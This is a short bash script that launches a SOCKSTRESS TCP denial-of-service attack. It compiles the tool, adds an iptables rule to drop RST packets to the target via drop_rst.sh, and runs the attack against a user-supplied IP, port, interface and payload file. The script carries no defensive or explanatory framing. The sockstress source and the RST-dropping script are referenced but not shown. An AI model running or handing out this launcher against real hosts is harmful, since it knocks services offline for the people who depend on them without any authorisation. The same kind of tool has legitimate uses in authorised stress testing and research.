#!/bin/bash

if [ "$#" -ne 4 ];then
    echo "Usage: ./sockstress.sh <target ip> <target port> <interface> <payload file>";
    exit 0
fi

echo "Compiling sockstress source"
make sockstress 

echo "Adding iptables rule to drop RST to destination"
./drop_rst.sh $1

echo "Starting SOCKSTRESS attack against $1:$2"
sudo ./sockstress $1:$2 $3 -p $4